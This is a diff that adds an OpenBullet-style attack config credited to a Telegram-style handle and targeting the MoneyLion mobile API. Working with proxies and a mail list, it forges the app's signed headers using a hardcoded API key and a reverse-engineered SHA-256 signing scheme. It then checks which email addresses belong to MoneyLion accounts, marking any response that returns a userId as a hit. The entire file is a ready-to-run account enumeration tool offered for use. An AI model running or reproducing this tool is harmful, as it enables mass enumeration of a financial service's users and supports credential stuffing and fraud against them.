@@ -1,0 +1,108 @@
+[SETTINGS]
+{
+  "Name": "MoneyLion VM(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-17T15:53:21.3245966+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+var Time1 = new Date , Times = Date.now()
+var mldate =  Time1.getDate().toString()+ Time1.getMonth().toString() + Time1.getFullYear().toString() ;
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var UUID = uuidv4();
+var UUID2 = uuidv4();
+END SCRIPT -> VARS "mldate,Times,UUID,UUID2"
+
+FUNCTION Hash SHA256 "<mldate>YSEBN56H6BPQKDCNEBEEFAACNJ5RD7ACHGSQGRFQTZQYNRJCKCX4NKS7NM75" -> VAR "y" 
+
+FUNCTION Hash SHA256 "<y>YSEBN56H6BPQKDCNEBEEFAACNJ5RD7ACHGSQGRFQTZQYNRJCKCX4NKS7NM75" -> VAR "A" 
+
+FUNCTION Hash SHA256 "<A>" -> VAR "b" 
+
+FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "deviceId" 
+
+BEGIN SCRIPT JavaScript
+var x =   'GET' + '\n' + '/v1/user/key-conversion'+'\n'+'email='+ USER +'\n'+b+'\n'+Times+'\n'+'Mozilla/5.0 (Linux; Android 7.1.2; G011A Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36'+'\n'+'7.39.0'+'\n'+'false'+'\n'+'mobileApp'+'\n'+ deviceId
+END SCRIPT -> VARS "x"
+
+FUNCTION Hash SHA256 "<A><x>" -> VAR "result" 
+
+FUNCTION UnixTimeToISO8601 "<Times>" -> VAR "ISO" 
+
+REQUEST GET "https://mobile.moneylion.com/v1/user/key-conversion?email=<USER>" 
+  
+  HEADER "accept: application/json" 
+  HEADER "x-app-session-id: <UUID>" 
+  HEADER "x-app-version: 7.39.0" 
+  HEADER "x-device-id: <deviceId>" 
+  HEADER "x-is-emulator: false" 
+  HEADER "x-local-iso: <ISO>" 
+  HEADER "x-ml-date: <mldate>" 
+  HEADER "x-ml-time: <Times>" 
+  HEADER "x-os-version: 7.1.2" 
+  HEADER "x-request-id: <UUID2>" 
+  HEADER "x-signed-auth: api_key=MMJhwmfTYJVFm9TiUdmYYyrf6Pzpzf3YN1,signature=<result>" 
+  HEADER "x-source: mobileApp" 
+  HEADER "x-user-agent-mobile: Mozilla/5.0 (Linux; Android 7.1.2; G011A Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36" 
+  HEADER "referer: mobile://SignUpEmail" 
+  HEADER "codebundleid: null" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "user-agent: okhttp/4.9.0" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" MatchesRegex "{\"userId\":\"([0-9a-z]{24,36})\"}" 
+  KEYCHAIN Failure OR 
+    KEY "{\"userId\":null}" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
